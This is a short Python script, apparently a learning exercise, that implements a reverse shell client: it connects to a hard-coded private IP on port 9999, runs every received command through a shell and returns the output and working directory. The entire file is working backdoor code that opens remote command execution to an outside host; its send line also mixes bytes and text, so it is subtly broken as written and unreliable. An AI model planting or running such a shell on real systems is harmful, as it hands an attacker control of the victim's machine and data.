import os
import socket
import subprocess

p = socket.socket()
host = "172.16.41.241"  # My IP address
port = 9999
p.connect ((host, port))


while True:
    data = (p.recv(1024).decode("utf-8"))

    if data[:2] == "cd":
        os.chdir(data[3:])

    if len(data) > 0:
        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_bytes.decode("utf-8")

        p.send(str.encode(output_str) + str(os.getcwd()) + ">")


p.close()
